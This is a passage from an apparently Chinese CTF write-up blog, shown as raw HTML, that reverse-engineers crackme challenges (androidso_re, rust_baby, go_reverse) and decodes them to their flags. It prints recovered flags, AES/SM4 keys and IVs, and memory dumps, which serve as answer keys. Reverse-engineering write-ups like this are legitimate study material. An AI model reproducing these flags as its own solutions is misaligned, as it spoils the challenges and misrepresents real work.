DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F4D 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F4E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F4F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F50 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F51 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F52 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F53 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F54 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F55 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F56 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F57 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F58 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F59 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F5A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F5B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F5C 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F5D 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F5E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F5F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F60 67                            DCB 0x67 ; g</span></span><br><span class="line"><span class="string">__const:0000000100003F61 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F62 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F63 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F64 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F65 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F66 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F67 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F68 C7                            DCB 0xC7</span></span><br><span class="line"><span class="string">__const:0000000100003F69 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F6A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F6B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F6C C7                            DCB 0xC7</span></span><br><span class="line"><span class="string">__const:0000000100003F6D 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F6E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F6F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F70 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F71 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F72 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F73 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F74 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F75 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F76 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F77 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F78 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F79 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F7A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F7B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F7C 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F7D 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F7E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F7F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F80 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F81 0F                            DCB  0xF</span></span><br><span class="line"><span class="string">__const:0000000100003F82 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F83 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F84 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003F85 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F86 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F87 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F88 37                            DCB 0x37 ; 7</span></span><br><span class="line"><span class="string">__const:0000000100003F89 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F8A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F8B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F8C 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F8D 1E                            DCB 0x1E</span></span><br><span class="line"><span class="string">__const:0000000100003F8E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F8F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F90 37                            DCB 0x37 ; 7</span></span><br><span class="line"><span class="string">__const:0000000100003F91 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F92 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F93 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F94 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F95 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F96 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F97 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F98 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F99 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F9A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F9B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F9C D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F9D 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F9E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F9F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA0 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003FA1 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003FA2 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA3 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA4 87                            DCB 0x87</span></span><br><span class="line"><span class="string">__const:0000000100003FA5 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003FA6 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA7 00                            DCB    0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分割数据</span></span><br><span class="line">lines = data.strip().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化结果列表</span></span><br><span class="line">result = []</span><br><span class="line">f = <span class="number">0</span></span><br><span class="line">k = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    parts = line.split()</span><br><span class="line">    byte_data = parts[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    hex_data = <span class="built_in">int</span>(byte_data, <span class="number">16</span>)</span><br><span class="line">    a = <span class="built_in">hex</span>(hex_data)[<span class="number">2</span>:]</span><br><span class="line">    a = a.zfill(<span class="number">2</span>)</span><br><span class="line">    k = a+k</span><br><span class="line">    f+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> f==<span class="number">4</span>:</span><br><span class="line">        f = <span class="number">0</span></span><br><span class="line">        result.append(<span class="string">&quot;0x&quot;</span>+k)</span><br><span class="line">        k = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">    result[i] = <span class="built_in">int</span>(result[i],<span class="number">16</span>)</span><br><span class="line">    result[i]-=<span class="number">0x1e</span></span><br><span class="line">    result[i]^=<span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">    result[i]-=<span class="number">0x14</span></span><br><span class="line">    result[i]//=<span class="built_in">ord</span>(<span class="string">&#x27;P&#x27;</span>)</span><br><span class="line">pl(result)</span><br><span class="line"><span class="comment">#flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125;</span></span><br></pre></td></tr></table></figure><h2 id="androidso-re">androidso_re</h2><p>感谢Z神的帮助，不然凭借我垃圾的安卓能力，一定会被吊死的QAQ</p><p>之后做安卓题的时候</p><p>先用die查看存档记录：</p><p><img src="https://s2.loli.net/2024/05/31/onbZYyuX4JrI83f.png" alt="image-20240531202856657"></p><p>这个存档记录不知道什么意思，但是后面有写对应的安卓版本，如果使用dex编辑器可以看到mainactivity在classes3.dex中，</p><p><img src="https://s2.loli.net/2024/05/31/Tcp2D3Mtrmjgwxz.png" alt="image-20240531204001444"></p><p>这个表明要用安卓7来打开它QAQ</p><p>之前试过用安卓10来调试，结果百分百寄，痛苦，用ida调so也断不了，QAQ</p><p>于是可以顺利用安卓7打开来调试</p><p>jadx：</p><p><img src="https://s2.loli.net/2024/05/31/yP7mhFSEjxKeCiw.png" alt="image-20240531204430593"></p><p>直接拿到密钥和iv</p><p>直接解</p><p><img src="https://s2.loli.net/2024/05/31/CXcNs7Oa3H5bv8t.png" alt="image-20240531204507379"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">188</span>cba<span class="number">3</span>a<span class="number">5</span><span class="keyword">c</span><span class="number">0</span>fbb<span class="number">2250</span>b<span class="number">5</span>a<span class="number">2e590</span><span class="keyword">c</span><span class="number">391</span>ce&#125;</span><br></pre></td></tr></table></figure><h2 id="rust-baby">rust_baby</h2><p>打开文件</p><p>随便调一下，看到一个一大串连续的指令，应该就是加密‭‭‭<br>看到有一堆base64，解一下</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;henhenaaa!&quot;</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">0</span>],</span><br><span class="line">        <span class="string">&quot;cryforhelp&quot;</span>:<span class="string">&quot;igdydo19TVE13ogW1AT5DgjPzHwPDQle1X7kS8TzHK8S5KCu9mnJ0uCnAQ4aV3CSYUl6QycpibWSLmqm2y/GqW6PNJBZ/C2RZuu+DfQFCxvLGHT5goG8BNl1ji2XB3x9GMg9T8Clatc=&quot;</span>,</span><br><span class="line">        <span class="string">&quot;whatadoor&quot;</span>:<span class="string">&quot;1145141919810WTF&quot;</span>,</span><br><span class="line">        <span class="string">&quot;iwantovisit&quot;</span>:<span class="string">&quot;O0PSwantf1agnow1&quot;</span></span><br><span class="line">        &#125;&#123;</span><br><span class="line">    <span class="string">&quot;where&quot;</span>:<span class="string">&quot;where is your flag?:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;omg&quot;</span>:<span class="string">&quot;correct flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;nonono&quot;</span>:<span class="string">&quot;nope, wrong flag&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;where&quot;</span><span class="punctuation">:</span><span class="string">&quot;where is your flag?:&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;omg&quot;</span><span class="punctuation">:</span><span class="string">&quot;correct flag&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;nonono&quot;</span><span class="punctuation">:</span><span class="string">&quot;nope, wrong flag&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>由于一开始看到了isdebugpresent，所以尝试了附加调试，但是调试的时候发现程序会直接退出</p><p><img src="https://s2.loli.net/2024/05/31/arOtlpSWmDZGj8e.png" alt="image-20240531221756988"></p><p>是因为这个程序有多个线程，这个时候不是main线程，这时要先切换到main线程再继续调试。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11111111111</span></span><br><span class="line"><span class="number">00112233</span></span><br><span class="line">aaaaaaaaaaa</span><br><span class="line">``aabbcc</span><br><span class="line"></span><br><span class="line">-<span class="number">1</span> -<span class="number">1 0 0 1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><p>不写了，shi</p><p>QAQ</p><h2 id="go-reverse">go_reverse</h2><p>go逆向</p><p>看到函数表</p><p><img src="https://s2.loli.net/2024/06/04/e8whYgxBtiCNnkV.png" alt="image-20240604004730098"></p><p>在main开头的函数里找到了这个</p><p><img src="https://s2.loli.net/2024/06/04/JODUWdTupR6IwAk.png" alt=""></p><p>怀疑是aes cbc，经过分析，应该是</p><p>xor-tea-sm4-aes-base32</p><p>然后想了很久，硬是没发现flag是在哪里的，最后放弃，去找flag，发现那个题是环境题，题目只给了最后的secret</p><p>那么假定</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZR<span class="number">23</span>CZDIW<span class="number">3</span>Q<span class="number">73</span>KKTC<span class="number">3</span>UJKE<span class="symbol">NFAHFUFKOBNMM7</span>FCHXGGY<span class="number">3</span>BJY<span class="number">3</span>B<span class="number">4</span>FWQ<span class="number">4</span>DCI<span class="number">5</span>DQOEEM<span class="name">M5</span>I<span class="number">6</span><span class="meta">O5</span>AZRABU<span class="symbol">NXA7</span>CVWEDYKDOT<span class="number">4</span>JL<span class="attr">VSLE3</span>WFGXI=</span><br></pre></td></tr></table></figure><p>这个是我的secret，QAQ</p><p>解完base32后解AES，这里看到了两个值</p><p>dPGWgcLpqmxw3uOXhKpKV009Cql和Bs^8*wZ4lu8oR&amp;@k</p><p>第一个是密钥可以解密，第二个应该是iv</p><p>然后继续看sm4，传入了Bs^8*wZ4lu8oR&amp;@kpg5g#k6Qo3L&amp;1EzT</p><p>如果用流程图可以看到</p><p><img src="https://s2.loli.net/2024/06/05/ILDEUdgBoGJ7TrX.png" alt="image-20240605180853890"></p><p>这里说明了模式是CTR,逐步动调，分别可以看到一个128位值，一个16位值，和在自己写的flag下面两段相同的32位值，以及动调两步，在加密完后上面32位值下面添加了32位值</p><p>再动调，值没了</p><p><img src="https://s2.loli.net/2024/06/05/23r9mRsMofBz4Yh.png" alt="image-20240605182238963"></p><p>而下一步的输入</p><p><img src="https://s2.loli.net/2024/06/05/4JnEtmdslN1HWOj.png" alt="image-20240605182501943"></p><p>用这个可以猜aes的key和iv的值</p><p><img src="https://s2.loli.net/2024/06/05/8PnRoEYkI7XTZMr.png" alt="image-20240605183107505"></p><p>发现key和iv是一样的，同理，后面也不知道SM4是怎么加密的</p><hr><p>下面的调试步骤一共调了5次，可能数据对不上QAQ</p><p>观察输入和输出，已知key：pg5g#k6Qo3L&amp;1EzT</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Dump <span class="number">0xC00001E480</span> - <span class="number">0xC00001E4A0</span> (<span class="number">32</span> bytes) :</span><br><span class="line">[<span class="number">0xE1</span>, <span class="number">0x41</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0x25</span>, <span class="number">0x51</span>, <span class="number">0xA6</span>, <span class="number">0xCC</span>, <span class="number">0x83</span>, <span class="number">0x5F</span>, <span class="number">0x38</span>, <span class="number">0x43</span>, <span class="number">0xBD</span>, <span class="number">0x93</span>, <span class="number">0xCC</span>, <span class="number">0x37</span>, <span class="number">0x88</span>, <span class="number">0x94</span>, <span class="number">0xF5</span>, <span class="number">0x44</span>, <span class="number">0xDC</span>, <span class="number">0xAB</span>, <span class="number">0xC2</span>, <span class="number">0xCB</span>, <span class="number">0x92</span>, <span class="number">0x1D</span>, <span class="number">0xF2</span>, <span class="number">0x05</span>, <span class="number">0xA4</span>, <span class="number">0x26</span>, <span class="number">0xC3</span>, <span class="number">0xD5</span>]</span><br><span class="line"></span><br><span class="line">[+] Dump <span class="number">0xC00001A330</span> - <span class="number">0xC00001A360</span> (<span class="number">48</span> bytes) :</span><br><span class="line">[<span class="number">0xA8</span>, <span class="number">0x37</span>, <span class="number">0x7D</span>, <span class="number">0xE3</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x64</span>, <span class="number">0x7B</span>, <span class="number">0x7D</span>, <span class="number">0xAE</span>, <span class="number">0xEF</span>, <span class="number">0xEC</span>, <span class="number">0x0E</span>, <span class="number">0x53</span>, <span class="number">0x26</span>, <span class="number">0x1F</span>, <span class="number">0x74</span>, <span class="number">0xCA</span>, <span class="number">0x39</span>, <span class="number">0xD2</span>, <span class="number">0x73</span>, <span class="number">0x5A</span>, <span class="number">0xA6</span>, <span class="number">0x69</span>, <span class="number">0xEB</span>, <span class="number">0xF4</span>, <span class="number">0x7E</span>, <span class="number">0xF1</span>, <span class="number">0x56</span>, <span class="number">0x6B</span>, <span class="number">0x93</span>, <span class="number">0xEE</span>, <span class="number">0xCB</span>, <span class="number">0xA8</span>, <span class="number">0x3A</span>, <span class="number">0x73</span>, <span class="number">0x5C</span>, <span class="number">0x79</span>, <span class="number">0xEC</span>, <span class="number">0xAE</span>, <span class="number">0xD1</span>, <span class="number">0x05</span>, <span class="number">0x6D</span>, <span class="number">0x18</span>, <span class="number">0x68</span>, <span class="number">0x38</span>, <span class="number">0xEA</span>, <span class="number">0x47</span>]</span><br></pre></td></tr></table></figure><p>从32变成了48，sm4是块加密，一块为128位，16字节，输入正好是16的倍数，不应该增加位数，</p><p>再次调试，发现input是一样的，也就是说这里是先干了其它的然后才SM4</p><p>继续调试：可以推测128字节的值是s盒</p><p>在一个位置得到一个16长度的值s，值是</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0xF5</span>, <span class="number">0xEE</span>, <span class="number">0x67</span>, <span class="number">0xFD</span>, <span class="number">0xD9</span>, <span class="number">0x8D</span>, <span class="number">0xD2</span>, <span class="number">0xA2</span>, <span class="number">0xCB</span>, <span class="number">0xAC</span>, <span class="number">0x8A</span>, <span class="number">0x44</span>, <span class="number">0x90</span>, <span class="number">0x17</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>]</span><br></pre></td></tr></table></figure><p>下断点，发现它在加密中被读取了，并发现输入在后面被填充了</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x71</span>, <span class="number">0xBF</span>, <span class="number">0xC2</span>, <span class="number">0x5A</span>, <span class="number">0xAA</span>, <span class="number">0x6E</span>, <span class="number">0x9C</span>, <span class="number">0xA0</span>, <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0xF3</span>, <span class="number">0x51</span>, <span class="number">0x07</span>, <span class="number">0x31</span>, <span class="number">0x3C</span>]</span><br></pre></td></tr></table></figure><p>然后s被添加了值变成了</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x76</span>, <span class="number">0x6D</span>, <span class="number">0x54</span>, <span class="number">0x43</span>, <span class="number">0xEB</span>, <span class="number">0x59</span>, <span class="number">0x17</span>, <span class="number">0x36</span>, <span class="number">0xAE</span>, <span class="number">0xB1</span>, <span class="number">0xE0</span>, <span class="number">0x2C</span>, <span class="number">0xB3</span>, <span class="number">0x8C</span>, <span class="number">0x40</span>, <span class="number">0x44</span>, <span class="number">0x76</span>, <span class="number">0x6D</span>, <span class="number">0x54</span>, <span class="number">0x43</span>, <span class="number">0xEB</span>, <span class="number">0x59</span>, <span class="number">0x17</span>, <span class="number">0x36</span>, <span class="number">0xAE</span>, <span class="number">0xB1</span>, <span class="number">0xE0</span>, <span class="number">0x2C</span>, <span class="number">0xB3</span>, <span class="number">0x8C</span>, <span class="number">0x40</span>, <span class="number">0x64</span>]</span><br></pre></td></tr></table></figure><p>有32个，后面添加的值只有最后一位从44变成了64</p><p>输入在后面添加了值</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x16</span>, <span class="number">0xCB</span>, <span class="number">0xBF</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x17</span>, <span class="number">0x24</span>, <span class="number">0x77</span>, <span class="number">0x5C</span>, <span class="number">0xAB</span>, <span class="number">0x8F</span>, <span class="number">0xA1</span>, <span class="number">0x0D</span>, <span class="number">0x4E</span>]</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/06/05/omLaOgvq9ZEupWe.png" alt="image-20240605204649515"></p><p>rax保存了这个值，定位var28</p><p>重调：</p><p><img src="https://s2.loli.net/2024/06/05/8jrNsa1xUFbVPCM.png" alt="image-20240605212044032"></p><p>在输入末尾</p><p><img src="https://s2.loli.net/2024/06/05/icy1wO9dkbgUeGJ.png" alt="image-20240605212131738"></p><p>临近结束，这个状态还在，保存一下值</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">input_ = [<span class="number">0xE1</span>, <span class="number">0x41</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0x25</span>, <span class="number">0x51</span>, <span class="number">0xA6</span>, <span class="number">0xCC</span>, <span class="number">0x83</span>, <span class="number">0x5F</span>, <span class="number">0x38</span>, <span class="number">0x43</span>, <span class="number">0xBD</span>, <span class="number">0x93</span>, <span class="number">0xCC</span>, <span class="number">0x37</span>, <span class="number">0x88</span>, <span class="number">0x94</span>, <span class="number">0xF5</span>, <span class="number">0x44</span>, <span class="number">0xDC</span>, <span class="number">0xAB</span>, <span class="number">0xC2</span>, <span class="number">0xCB</span>, <span class="number">0x92</span>, <span class="number">0x1D</span>, <span class="number">0xF2</span>, <span class="number">0x05</span>, <span class="number">0xA4</span>, <span class="number">0x26</span>, <span class="number">0xC3</span>, <span class="number">0xD5</span>, <span class="number">0x88</span>, <span class="number">0x8F</span>, <span class="number">0x9B</span>, <span class="number">0xCE</span>, <span class="number">0xD2</span>, <span class="number">0x3C</span>, <span class="number">0x34</span>, <span class="number">0x44</span>, <span class="number">0xE0</span>, <span class="number">0x4D</span>, <span class="number">0xC4</span>, <span class="number">0x45</span>, <span class="number">0x68</span>, <span class="number">0x56</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0xC6</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x34</span>, <span class="number">0x13</span>, <span class="number">0xF6</span>, <span class="number">0xC4</span>, <span class="number">0xF6</span>, <span class="number">0xFC</span>, <span class="number">0x15</span>, <span class="number">0x6E</span>, <span class="number">0x9C</span>, <span class="number">0xA5</span>, <span class="number">0x0F</span>, <span class="number">0x87</span>, <span class="number">0xCB</span>]</span><br><span class="line">p = [<span class="number">0x6F</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x08</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0x1F</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0xDD</span>, <span class="number">0x7D</span>, <span class="number">0x8D</span>, <span class="number">0xB9</span>, <span class="number">0x6F</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x08</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0x1F</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0xDD</span>, <span class="number">0x7D</span>, <span class="number">0x8D</span>, <span class="number">0xD9</span>]</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/06/05/9eXj4CqIRWMgEdi.png" alt="image-20240605213108529"></p><p>这里保存了p的前16个值，然后p变成了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0x88</span>, <span class="number">0</span>x8F, <span class="number">0</span>x9B, <span class="number">0</span>xCE, <span class="number">0</span>xD2, <span class="number">0</span>x3C, <span class="number">0</span>x34, <span class="number">0</span>x44, <span class="number">0</span>xE0, <span class="number">0</span>x4D, <span class="number">0</span>xC4, <span class="number">0</span>x45, <span class="number">0</span>x68, <span class="number">0</span>x56, <span class="number">0</span>x7A, <span class="number">0</span>x09, <span class="number">0</span>xC6, <span class="number">0</span>x70, <span class="number">0</span>x65, <span class="number">0</span>x34, <span class="number">0</span>x13, <span class="number">0</span>xF6, <span class="number">0</span>xC4, <span class="number">0</span>xF6, <span class="number">0</span>xFC, <span class="number">0</span>x15, <span class="number">0</span>x6E, <span class="number">0</span>x9C, <span class="number">0</span>xA5, <span class="number">0</span>x0F, <span class="number">0</span>x87, <span class="number">0</span>xCB</span><br></pre></td></tr></table></figure><p>即input加长后的32位，有理由</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">out</span> = [<span class="number">0x6F</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x08</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0x1F</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0xDD</span>, <span class="number">0x7D</span>, <span class="number">0x8D</span>, <span class="number">0xB9</span>, <span class="number">0x88</span>, <span class="number">0x8F</span>, <span class="number">0x9B</span>, <span class="number">0xCE</span>, <span class="number">0xD2</span>, <span class="number">0x3C</span>, <span class="number">0x34</span>, <span class="number">0x44</span>, <span class="number">0xE0</span>, <span class="number">0x4D</span>, <span class="number">0xC4</span>, <span class="number">0x45</span>, <span class="number">0x68</span>, <span class="number">0x56</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0xC6</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x34</span>, <span class="number">0x13</span>, <span class="number">0xF6</span>, <span class="number">0xC4</span>, <span class="number">0xF6</span>, <span class="number">0xFC</span>, <span class="number">0x15</span>, <span class="number">0x6E</span>, <span class="number">0x9C</span>, <span class="number">0xA5</span>, <span class="number">0x0F</span>, <span class="number">0x87</span>, <span class="number">0xCB</span>]</span><br></pre></td></tr></table></figure><p>好好好，我理解了，看了一下CTR的定义，相当于其实是对计数器加密，然后和明文异或</p><p><img src="https://s2.loli.net/2024/06/05/LDPlI3E1UJsMxZK.png" alt="image-20240605225958990"></p><p>然后还是没有发现第三个部分，看了网上的wp才知道有第三段QAQ</p><p>得到了明文</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0xe1</span>,<span class="number">0</span>x41,<span class="number">0</span>xa7,<span class="number">0</span>xff,<span class="number">0</span>x25,<span class="number">0</span>x51,<span class="number">0</span>xa6,<span class="number">0</span>xcc,<span class="number">0</span>x83,<span class="number">0</span>x5f,<span class="number">0</span>x38,<span class="number">0</span>x43,<span class="number">0</span>xbd,<span class="number">0</span>x93,<span class="number">0</span>xcc,<span class="number">0</span>x37,<span class="number">0</span>x67,<span class="number">0</span>xd8,<span class="number">0</span>x8c,<span class="number">0</span>xbc,<span class="number">0</span>x24,<span class="number">0</span>x6e,<span class="number">0</span>x04,<span class="number">0</span>x8d,<span class="number">0</span>xcf,<span class="number">0</span>x79,<span class="number">0</span>xcb,<span class="number">0</span>x6e,<span class="number">0</span>xfe,<span class="number">0</span>xf4,<span class="number">0</span>x45,<span class="number">0</span>xe2,<span class="number">0</span>x12,<span class="number">0</span>xbf,<span class="number">0</span>x16,<span class="number">0</span>x3d,<span class="number">0</span>x3b,<span class="number">0</span>x4a,<span class="number">0</span>xf7,<span class="number">0</span>x77,<span class="number">0</span>x58,<span class="number">0</span>x6f,<span 